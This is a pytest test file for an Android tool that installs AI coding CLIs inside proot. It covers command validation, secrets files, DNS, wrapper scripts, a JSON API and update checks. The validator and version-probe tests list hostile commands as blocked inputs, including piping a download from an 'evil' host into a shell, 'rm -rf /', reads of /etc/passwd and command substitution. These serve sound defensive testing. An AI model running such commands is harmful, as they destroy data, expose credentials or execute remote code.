# -*- coding: utf-8 -*-
"""Unit tests for ancli-core.py security & wrapper-generation logic.

Runs on any host (no Android device required). Import-safe: the module only
reads config files that don't exist on a dev machine.
"""
import json
import os
import re
import sys

import pytest

# ancli-core.py contains a hyphen, so it cannot be imported by module name;
# load it by explicit file path instead.
_core_path = os.path.join(os.path.dirname(__file__), "..", "src", "ancli-core.py")
import importlib.util  # noqa: E402
_spec = importlib.util.spec_from_file_location("ancli_core", _core_path)
core = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(core)


@pytest.fixture(autouse=True)
def _no_real_network(monkeypatch):
    """Tests must be hermetic and fast: any real HTTP call is a bug.

    Cases that need upstream behaviour patch `_http_json` / `_http_text`
    themselves, and their patch is applied after this fixture, so it wins.
    `urlopen` is covered too, so official version checks cannot silently reach
    the network either."""
    def boom(*args, **kwargs):
        raise AssertionError("test attempted a real network request")

    monkeypatch.setattr(core, "_http_text", boom)
    monkeypatch.setattr(core, "_http_json", boom)
    monkeypatch.setattr(core.urllib.request, "urlopen", boom)


# ---------------------------------------------------------------------------
# validate_cmd
# ---------------------------------------------------------------------------

class TestValidateCmd:
    @pytest.mark.parametrize("cmd", [
        "pip install --break-system-packages aider-chat",
        "npm install -g something",
        "apt-get update -qy",
        "curl -sL https://example.com/x | bash -s -- --dir /usr/local/bin",
        "rm -f /usr/local/bin/mimo",
        "bash /tmp/install_agy.sh --dir /usr/local/bin",
        "sh /tmp/install_x.sh",
        "env GROK_BIN_DIR=/usr/local/bin bash /tmp/install_grok.sh",
        "curl -L https://a/b -o /tmp/x.tar.gz && tar -xzf /tmp/x.tar.gz -C /usr/local/bin && rm /tmp/x.tar.gz",
    ])
    def test_allows_legit_registry_commands(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf / ; echo pwned",
        "pip install x > /etc/passwd",
        "npm install x < /etc/shadow",
        "bash /tmp/x.sh &\ncurl evil",
        "curl http://evil/ | sh; touch /pwned",
        "bash /tmp/x.sh & disown",
        "rm -rf /$(whoami)",
        "curl -o /tmp/x `id`",
        "echo hello",
        "sudo rm -rf /",
        "cat /etc/passwd",
        "env A=1; rm -rf /",
    ])
    def test_blocks_dangerous_commands(self, cmd):
        assert core.validate_cmd(cmd) is False

    @pytest.mark.parametrize("cmd", [
        # Semicolons etc. inside quoted values are data, not shell syntax
        "env GROK_BIN_DIR='a;b' bash /tmp/install_grok.sh",
        'env FLAG="x > y" bash /tmp/install.sh',
        "bash /tmp/x.sh --dir '/a b'",
        "curl -sL 'https://x/a;b.sh' -o /tmp/x.sh && bash /tmp/x.sh",
        # $() inside single quotes is literal -> allowed
        "curl -sL 'https://x/$(id)' -o /tmp/x.sh",
        # & inside double quotes is literal -> allowed
        'env FLAG="a & b" bash /tmp/install.sh',
    ])
    def test_allows_quoted_special_chars(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        # $() / backticks execute even inside double quotes -> must be blocked
        'env FLAG="$(rm -rf /)" bash /tmp/install.sh',
        'env FLAG="`id`" bash /tmp/install.sh',
        # ANSI-C $'...' quoting expands escapes at runtime -> not stripped
        "curl $';rm -rf /' -o /tmp/x.sh",
    ])
    def test_blocks_command_substitution_inside_double_quotes(self, cmd):
        assert core.validate_cmd(cmd) is False

    def test_whitelist_prefix_requires_trailing_space(self):
        # "curl" alone (no space) must not match the "curl " prefix
        assert core.validate_cmd("curl") is False


# ---------------------------------------------------------------------------
# _write_secrets_file
# ---------------------------------------------------------------------------

class TestWriteSecretsFile:
    def test_writes_quoted_exports_and_permissions(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path.parent))
        chowns = []
        chmods = []
        monkeypatch.setattr(core.os, "system",
                            lambda c: chowns.append(c) or 0)
        monkeypatch.setattr(core.os, "chmod",
                            lambda p, m: chmods.append((os.path.normpath(str(p)), m)))

        core._write_secrets_file("my-tool", {"API_KEY": "sk-a b'c", "BASE_URL": "https://x"})

        secrets = tmp_path / "my-tool.env"
        assert secrets.exists()
        content = secrets.read_text(encoding="utf-8")
        assert "export API_KEY='sk-a b'\"'\"'c'\n" in content  # shlex.quote escaping
        assert "export BASE_URL=https://x\n" in content  # plain value stays unquoted
        # Directory 0700, secrets file 0600 (POSIX modes; asserted via chmod calls
        # since Windows filesystems do not honor mode bits)
        assert (os.path.normpath(str(tmp_path)), 0o700) in chmods
        assert (os.path.normpath(str(secrets)), 0o600) in chmods
        # shell user (UID 2000) must be able to traverse dir and read the file
        assert any("chown 2000:2000" in c and str(tmp_path) in c for c in chowns)
        assert any("chown 2000:2000" in c and "my-tool.env" in c for c in chowns)

    def test_replaces_existing_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        (tmp_path / "tool.env").write_text("export OLD=1\n")
        core._write_secrets_file("tool", {"NEW": "2"})
        content = (tmp_path / "tool.env").read_text(encoding="utf-8")
        assert "OLD" not in content
        assert "NEW" in content


# ---------------------------------------------------------------------------
# Bundled application catalog
# ---------------------------------------------------------------------------

class TestBundledCatalog:
    def test_loads_the_module_owned_catalog_without_network(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        catalog = tmp_path / "ancli" / "registry.json"
        catalog.parent.mkdir(parents=True)
        catalog.write_text(json.dumps({"version": "test", "apps": {"foo": {}}}), encoding="utf-8")
        assert core.load_registry()["apps"]["foo"] == {}

    def test_missing_catalog_can_be_reported_without_exiting(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "missing"))
        assert core.load_registry(required=False) == {}


# ---------------------------------------------------------------------------
# pipe-script install command construction
# ---------------------------------------------------------------------------

class TestPipeScriptCommand:
    def test_env_prefix_uses_env_not_nested_bash_c(self):
        # Exercise the production builder (not a copy of it, which would stay
        # green even if _install_pipe_script drifted).
        installer_env = {"GROK_BIN_DIR": "/usr/local/bin", "FLAG": "a b"}
        script_path = "/tmp/install_grok.sh"
        installer_args = '--dir "/a b"'

        cmd = core._build_pipe_script_cmd(script_path, installer_env, installer_args)

        # No nested single quotes; every value individually quoted
        assert cmd.startswith("env ")
        assert "bash -c '" not in cmd
        assert core.validate_cmd(cmd) is True
        # Round-trip through shlex must reproduce the intended argv
        argv = shlex_split(cmd)
        assert argv[0] == "env"
        assert "GROK_BIN_DIR=/usr/local/bin" in argv
        assert "FLAG=a b" in argv
        assert argv[argv.index("bash") + 1] == script_path
        # Quoted installer arg survives as a single token
        assert "--dir" in argv and "/a b" in argv

    def test_without_env_or_args_is_a_plain_bash_call(self):
        assert core._build_pipe_script_cmd("/tmp/install_x.sh") == "bash /tmp/install_x.sh"


# ---------------------------------------------------------------------------
# DNS resolution
# ---------------------------------------------------------------------------

class TestDNS:
    def test_get_android_dns_reads_real_servers(self, monkeypatch):
        outputs = iter(["192.168.1.1", "0.0.0.0"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_write_resolv_conf_prefers_android_dns(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        os.makedirs(tmp_path / "etc", exist_ok=True)
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: b"192.168.1.1",
        )
        core._write_resolv_conf()
        content = (tmp_path / "etc" / "resolv.conf").read_text(encoding="utf-8")
        lines = content.strip().splitlines()
        assert lines[0] == "nameserver 192.168.1.1"  # the device's real DNS first
        assert lines[1] == "nameserver 223.5.5.5"    # then the China-friendly fallback
        assert len(lines) == 3                        # glibc MAXNS
        assert len(lines) == len(set(lines))          # no duplicates
        assert "8.8.8.8" not in lines                 # never leads: blocked on many networks

    def test_get_android_dns_rejects_garbage(self, monkeypatch):
        # Only two getprop calls happen (net.dns1/net.dns2): a non-IP is rejected
        # and the IPv4 duplicate is deduplicated.
        outputs = iter(["10.0.0.2", "10.0.0.2"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["10.0.0.2"]

        # Garbage first, IPv6 second: the junk is dropped, the IPv6 address is kept
        # (it is the only resolver this network offers — dumpsys-only IPv6 networks
        # exist on carriers that hand out no IPv4 DNS).
        outputs = iter(["not-an-ip", "2001:db8::1"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["2001:db8::1"]

        # …but when an IPv4 resolver exists, only IPv4 is used: the three glibc
        # slots are better spent on resolvers a VPN-less container can always reach.
        outputs = iter(["2001:db8::1", "10.0.0.9"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["10.0.0.9"]


# ---------------------------------------------------------------------------
# wrapper generation
# ---------------------------------------------------------------------------

class TestWrapperGeneration:
    def test_wrapper_template_has_cwd_fallback_and_binds(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("mimo", {"OPENAI_API_KEY": "sk-x"}, ["HOME=/root"])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        # cwd fallback for unbound host paths -> container HOME
        assert "PROOT_CWD=\"$PWD\"" in wrapper
        assert "case \"$PROOT_CWD\"" in wrapper
        assert '-w "$PROOT_CWD"' in wrapper
        assert "PROOT_CWD=/root" in wrapper
        # root-dir redirect so TUI tools don't scan the whole container fs
        assert 'if [ "$PROOT_CWD" = "/" ]; then' in wrapper
        assert "Launched from /" not in wrapper
        # /dev/shm conditional bind for Node/Bun workers
        assert 'SHM_BIND="-b ' in wrapper
        assert "shm:/dev/shm" in wrapper
        # The wrapper considers every common Android tree and skips only paths
        # absent from the caller's mount namespace (for example /sdcard under
        # some adb-root shells), avoiding a noisy proot warning.
        assert "for _ancli_bind in /sdcard /storage /mnt /data /apex /linkerconfig /system" in wrapper
        assert 'ANCLI_BIND_ARGS="$ANCLI_BIND_ARGS -b $_ancli_bind"' in wrapper
        assert "$ANCLI_BIND_ARGS" in wrapper
        # The Android-side launcher and generated app wrappers both bind the
        # Agent lifetime to the original terminal parent.
        assert 'ANCLI_PARENT_PID="$PPID"' in wrapper
        assert 'kill -TERM "$ANCLI_CHILD_PID"' in wrapper
        assert 'wait "$ANCLI_CHILD_PID"' in wrapper
        # env bootstrap + per-tool secrets sourcing
        assert "ancli_env.sh" in wrapper
        assert "secrets/mimo.env" in wrapper
        # systemless + KSU/AP dual injection paths were attempted
        assert (tmp_path / "mod" / "system" / "bin" / "mimo").exists()

    def test_wrapper_rejects_path_traversal_executable(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        core.generate_proot_wrapper("../evil", {})
        assert not (tmp_path / "ancli" / "bin").exists()


# ---------------------------------------------------------------------------
# WebUI JSON API
# ---------------------------------------------------------------------------

class TestWebUIJsonAPI:
    def _reg(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        reg = {
            "version": "1.0",
            "apps": {
                "mimo": {"name": "MiMo Code", "executable": "mimo"},
                "agy": {"name": "Antigravity", "executable": "agy",
                        "version": "2.0", "env_vars": ["GEMINI_API_KEY"],
                        "optional_env_vars": ["HTTP_PROXY"]},
            },
        }
        reg_path = tmp_path / "ancli" / "registry.json"
        reg_path.write_text(json.dumps(reg), encoding="utf-8")
        return reg

    def test_list_apps_json_clean_output(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"mimo": {"executable": "mimo", "installed_version": "1.0",
                                      "env": {"OPENAI_API_KEY": "x"}}})
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "usr" / "local" / "bin" / "mimo").write_text("x")

        core.list_apps_json()
        data = json.loads(capsys.readouterr().out)  # must be pure JSON
        apps = {a["id"]: a for a in data["apps"]}
        assert apps["mimo"]["installed"] is True and apps["mimo"]["active"] is True
        assert apps["mimo"]["configured_keys"] == ["OPENAI_API_KEY"]
        assert apps["agy"]["installed"] is False
        assert "native" not in apps["agy"]
        assert apps["agy"]["update_available"] is False  # not installed
        assert "GEMINI_API_KEY" in apps["agy"]["required_env_vars"]
        assert "HTTP_PROXY" in apps["agy"]["optional_env_vars"]

    def test_status_json(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "rootfs" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "bin" / "bash").write_text("")
        (tmp_path / "ancli" / "bin" / "proot").write_text("")

        core.status_json()
        d = json.loads(capsys.readouterr().out)
        assert d["rootfs_ready"] is True and d["proot_deployed"] is True
        assert d["installed_count"] == 0

    def test_parse_set_env(self):
        assert core.parse_set_env(["--set", "A=1", "--set", "B=2", "junk"]) == {"A": "1", "B": "2"}
        assert core.parse_set_env([]) == {}

    def test_reconfigure_noninteractive_merges_existing(self, tmp_path, monkeypatch):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"agy": {"executable": "agy", "installed_version": "1.0",
                                     "env": {"GEMINI_API_KEY": "old"}}})
        registry = {"apps": {"agy": {"name": "Antigravity", "executable": "agy",
                                     "env_vars": ["GEMINI_API_KEY"]}}}

        core.reconfigure_app("agy", registry, set_env={"GEMINI_API_KEY": "new"})

        installed = core.load_installed()
        assert installed["agy"]["configured_env"] == ["GEMINI_API_KEY"]
        # wrapper regenerated with the new secret
        wrapper = (tmp_path / "ancli" / "bin" / "agy").read_text(encoding="utf-8")
        assert "secrets/agy.env" in wrapper
        secrets = (tmp_path / "secrets" / "agy.env").read_text(encoding="utf-8")
        assert "GEMINI_API_KEY" in secrets and "new" in secrets


# ---------------------------------------------------------------------------
# WebUI JSON API
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Registry auth-config policy: only tools whose official docs confirm env-var
# auth keep env_vars. (Claude Code: ANTHROPIC_API_KEY skips its login prompt.)
# ---------------------------------------------------------------------------

def test_registry_env_vars_only_claude_code():
    """Policy: every app exposes the generic proxy trio (the documented escape hatch
    for TUN-only setups). Provider keys are exposed only where the vendor documents
    env-based auth — Claude Code (Anthropic) and DeepSeek Harness (DeepSeek); the
    other tools own their login flow internally."""
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    assert 'claude-code' in reg['apps']
    proxy_vars = {'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY'}
    provider_vars = {
        'claude-code': {'ANTHROPIC_API_KEY', 'ANTHROPIC_AUTH_TOKEN',
                        'ANTHROPIC_BASE_URL', 'ANTHROPIC_MODEL'},
        'dsh': {'DEEPSEEK_API_KEY', 'DEEPSEEK_BASE_URL'},
    }
    for aid, app in reg['apps'].items():
        exposed = set(app.get('env_vars') or []) | set(app.get('optional_env_vars') or [])
        allowed = proxy_vars | provider_vars.get(aid, set())
        assert app.get('optional_env_vars'), f'{aid} must expose the proxy escape hatch'
        assert proxy_vars <= exposed, f'{aid} is missing the proxy env vars'
        assert exposed <= allowed, f'{aid} exposes unexpected env vars: {sorted(exposed - allowed)}'
        if aid in provider_vars:
            assert provider_vars[aid] <= exposed, f'{aid} must keep its provider keys'


def shlex_quote(s):
    import shlex
    return shlex.quote(s)


def shlex_split(s):
    import shlex
    return shlex.split(s)


# ---------------------------------------------------------------------------
# Version comparison / update detection
# ---------------------------------------------------------------------------

class TestVersionCompare:
    def test_ver_key_parses_the_same_formats(self):
        # The prerelease-aware _ver_key replaced the older numeric-only parser;
        # its first four slots are still the version core.
        assert core._ver_key('v1.2.3')[:4] == (1, 2, 3, 0)
        assert core._ver_key('1.2.3')[:4] == (1, 2, 3, 0)
        assert core._ver_key('grok-dev@1.1.7')[:4] == (1, 1, 7, 0)
        assert core._ver_key('2.1.226')[:4] == (2, 1, 226, 0)
        assert core._ver_key('abc') is None
        assert core._ver_key('') is None

    def test_update_available_basic(self):
        assert core._update_available('1.0.0', '1.0.1') is True
        assert core._update_available('1.0.1', '1.0.0') is False
        assert core._update_available('1.0.1', '1.0.1') is False
        assert core._update_available('2.1.226', '2.1.226') is False

    def test_update_available_old_record_migration(self):
        # Old install records stored the AnCLI version (1.2.2) instead of the
        # tool version; a newer cloud version must still be detected.
        assert core._update_available('1.2.2', '2.1.226') is True
        assert core._update_available('1.2.2', '0.1.10') is False

    def test_update_available_unparsable(self):
        assert core._update_available('unknown', '1.0.0') is True
        assert core._update_available('1.0.0', 'unknown') is False
        assert core._update_available('unknown', 'unknown') is False


# ---------------------------------------------------------------------------
# Official ("upstream") version detection
# ---------------------------------------------------------------------------

class TestFirstVersion:
    @pytest.mark.parametrize("text,expected", [
        ('v2.1.283', '2.1.283'),
        ('2.1.226 (Claude Code)', '2.1.226'),
        ('grok 1.0.0 (3cd0d0cbce)', '1.0.0'),
        ('aider 0.86.2', '0.86.2'),
        ('1.0.41\n', '1.0.41'),
        ('', None),
        (None, None),
        ('no version here', None),
    ])
    def test_extracts_first_version_token(self, text, expected):
        assert core._first_version(text) == expected


class TestLatestVersion:
    def _app(self, spec, declared='9.9.9'):
        return {'latest': spec, 'version': declared}

    def test_github_release_tag(self, monkeypatch):
        urls = []

        def fake_json(url, timeout=15):
            urls.append(url)
            return {'tag_name': 'v2.1.283'}

        monkeypatch.setattr(core, '_http_json', fake_json)
        ver, src, err = core._latest_version(
            self._app({'source': 'github', 'repo': 'anthropics/claude-code'}), {})
        assert (ver, src, err) == ('2.1.283', 'github:anthropics/claude-code', None)
        assert urls == ['https://api.github.com/repos/anthropics/claude-code/releases/latest']

    def test_pypi_uses_dotted_path(self, monkeypatch):
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'info': {'version': '0.86.2'}})
        ver, src, err = core._latest_version(self._app({'source': 'pypi', 'package': 'aider-chat'}), {})
        assert (ver, src, err) == ('0.86.2', 'pypi:aider-chat', None)

    def test_npm_latest_dist_tag(self, monkeypatch):
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'version': '1.2.3'})
        assert core._latest_version(self._app({'source': 'npm', 'package': 'x'}), {})[0] == '1.2.3'

    def test_json_manifest_path(self, monkeypatch):
        payload = {'version': '1.2.12', 'url': 'https://example/x.tar.gz'}
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: payload)
        ver, src, err = core._latest_version(
            self._app({'source': 'json', 'url': 'https://example/manifest.json', 'path': 'version'}), {})
        assert (ver, src, err) == ('1.2.12', 'manifest', None)

    def test_text_channel_falls_back_to_mirror(self, monkeypatch):
        tried = []

        def fake_text(url, timeout=15):
            tried.append(url)
            if 'x.ai' in url:
                raise OSError('connection refused')
            return '1.0.41\n'

        monkeypatch.setattr(core, '_http_text', fake_text)
        spec = {'source': 'text', 'urls': ['https://x.ai/cli/stable',
                                          'https://storage.googleapis.com/grok-build-public-artifacts/cli/stable']}
        assert core._latest_version(self._app(spec), {}) == ('1.0.41', 'channel', None)
        assert len(tried) == 2

    def test_text_channel_reports_error_when_all_urls_fail(self, monkeypatch):
        def boom(url, timeout=15):
            raise OSError('no route')

        monkeypatch.setattr(core, '_http_text', boom)
        ver, src, err = core._latest_version(self._app({'source': 'text', 'urls': ['https://x/1']}), {})
        assert ver is None and src == 'channel' and 'no route' in err

    def test_static_source_uses_declared_version(self):
        assert core._latest_version(self._app({'source': 'static'}, declared='1.1.27'), {}) == \
            ('1.1.27', 'registry', None)

    def test_none_source_is_explicitly_undetectable(self):
        assert core._latest_version(self._app({'source': 'none'}, declared='1.0.0'), {}) == \
            (None, 'none', None)

    def test_missing_spec_falls_back_to_declared_version(self):
        # A registry entry written before this feature must still work.
        assert core._latest_version({'version': '3.4.5'}, {}) == ('3.4.5', 'registry', None)

    def test_network_failure_is_reported_not_raised(self, monkeypatch):
        def boom(url, timeout=15):
            raise OSError('tls handshake failed')

        monkeypatch.setattr(core, '_http_json', boom)
        ver, src, err = core._latest_version(self._app({'source': 'github', 'repo': 'a/b'}), {})
        assert ver is None and src == 'github:a/b' and 'tls handshake failed' in err


# ---------------------------------------------------------------------------
# Installed-version probing
# ---------------------------------------------------------------------------

class TestVersionProbe:
    def test_registry_executables_extend_the_whitelist_only(self):
        registry = {'apps': {'claude-code': {'executable': 'claude'}}}
        prefixes = core._registry_exe_prefixes(registry)
        assert 'claude ' in prefixes
        assert core.validate_cmd('claude --version', prefixes) is True
        # The default whitelist is unchanged: an arbitrary command stays blocked.
        assert core.validate_cmd('claude --version') is False
        assert core.validate_cmd('cat /etc/passwd', prefixes) is False
        assert core.validate_cmd('claude --version; rm -rf /', prefixes) is False

    def test_probe_parses_version_cmd_output(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd',
                            lambda *a, **k: (True, '2.1.226 (Claude Code)\n'))
        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
        assert core._probe_installed_version(app) == '2.1.226'

    def test_probe_ignores_a_spurious_non_zero_exit_code(self, monkeypatch):
        # On the real device `grok --version` prints the version but exits 126;
        # the tools' own output is authoritative, not the wrapper's status.
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (False, 'grok 1.0.0 (3cd0d0cbce)\n'))
        app = {'version_cmd': 'grok --version', 'executable': 'grok'}
        assert core._probe_installed_version(app) == '1.0.0'

    def test_probe_retries_with_stderr_merged(self, monkeypatch):
        calls = []

        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            calls.append(merge_stderr)
            if merge_stderr:
                return True, 'mimo 0.1.10\n'
            return True, ''

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'mimo --version', 'executable': 'mimo'}
        assert core._probe_installed_version(app) == '0.1.10'
        assert calls == [False, True]

    def test_probe_does_not_read_versions_out_of_error_banners(self, monkeypatch):
        """H2: an error banner mentioning a runtime version must not be stored as
        the tool's version (that would hide real updates)."""
        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            if merge_stderr:
                return True, 'Error: current node v20.11.0 is not supported\n'
            return True, ''

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
        assert core._probe_installed_version(app) is None

    def test_probe_refuses_operator_chains(self, monkeypatch):
        """M7: version_cmd runs automatically on WebUI load, so it must not be
        usable as an arbitrary command chain."""
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
        app = {'version_cmd': 'claude --version || curl http://evil/x | bash',
               'executable': 'claude', 'name': 'Claude Code'}
        assert core._probe_installed_version(app) is None

    def test_probe_refuses_a_command_that_is_not_its_own_executable(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
        app = {'version_cmd': 'curl http://evil/x', 'executable': 'claude', 'name': 'Claude Code'}
        assert core._probe_installed_version(app) is None

    def test_probe_without_version_cmd_is_none(self):
        assert core._probe_installed_version({}) is None

    def test_probe_allows_its_own_executable_without_catalog(self, tmp_path, monkeypatch):
        """A probe stays valid even when the bundled catalog is unavailable."""
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        seen = {}

        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            seen['prefixes'] = prefixes
            return True, '1.2.3'

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'foo --version', 'executable': 'foo'}
        assert core._probe_installed_version(app) == '1.2.3'
        assert 'foo ' in seen['prefixes']
        assert core.validate_cmd('foo --version', seen['prefixes']) is True

    def test_probe_without_any_version_is_none(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, 'no version here'))
        assert core._probe_installed_version({'version_cmd': 'x --version'}) is None


class TestJsonStdoutPurity:
    def test_stdout_to_stderr_redirects_python_and_child_output(self, capfd):
        """`--json` must survive os.system/subprocess noise, not just print()."""
        import subprocess

        with core._stdout_to_stderr():
            print("python-level noise")
            subprocess.run("echo child-level noise", shell=True)

        out, err = capfd.readouterr()
        assert "python-level noise" not in out
        assert "child-level noise" not in out
        assert "python-level noise" in err
        assert "child-level noise" in err

    def test_list_apps_json_stays_parseable_despite_noisy_cache_load(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
        # Corrupt state: load_installed() prints a warning before any JSON is emitted.
        os.makedirs(tmp_path / "ancli", exist_ok=True)
        (tmp_path / "ancli" / "installed.json").write_text("{not json", encoding="utf-8")

        core.list_apps_json()
        assert json.loads(capsys.readouterr().out)["apps"] == []


# ---------------------------------------------------------------------------
# `ancli check` / update cache / list --json integration
# ---------------------------------------------------------------------------

class TestUpdateCheckFlow:
    def _env(self, tmp_path, monkeypatch, apps=None):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "usr" / "local" / "bin" / "claude").write_text("x")
        registry = {"version": "1.2.3", "apps": apps if apps is not None else {
            "claude-code": {"name": "Claude Code", "executable": "claude",
                            "version_cmd": "claude --version",
                            "update_cmd": "curl -L https://github.com/anthropics/claude-code/"
                                          "releases/latest/download/claude-linux-arm64.tar.gz -o /tmp/claude.tar.gz",
                            "latest": {"source": "github", "repo": "anthropics/claude-code"},
                            "version": "2.1.283"},
        }}
        reg_path = tmp_path / "ancli" / "registry.json"
        reg_path.write_text(json.dumps(registry), encoding="utf-8")
        return registry

    def test_check_updates_probes_installed_and_caches_official(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        cache = core.check_updates(registry)
        capsys.readouterr()

        # installed.json now holds the tool's real version, marked verified
        installed = core.load_installed()
        assert installed['claude-code']['installed_version'] == '2.1.283'
        assert installed['claude-code']['version_verified'] is True
        # upstream verdict cached
        assert cache['latest']['claude-code']['version'] == '2.1.283'
        assert cache['latest']['claude-code']['source'] == 'github:anthropics/claude-code'
        assert cache['ts'] > 0
        assert json.loads((tmp_path / "ancli" / ".update_cache.json").read_text(encoding="utf-8"))['latest']['claude-code']['version'] == '2.1.283'

    def test_check_updates_json_emits_pure_json(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'load_registry', lambda: registry)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        core.check_updates_json()
        data = json.loads(capsys.readouterr().out)   # must be parseable with no noise
        assert data['updates'] == 1
        app = data['apps'][0]
        assert app['id'] == 'claude-code'
        assert app['update_available'] is True
        assert app['cloud_version'] == '2.1.283'
        assert app['cloud_source'] == 'github:anthropics/claude-code'

    def test_list_apps_json_reports_cached_official_version(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226",
                                             "version_verified": True, "env": {}}})
        core._save_update_cache({"ts": 1700000000, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code", "error": None}}})

        core.list_apps_json()
        data = json.loads(capsys.readouterr().out)
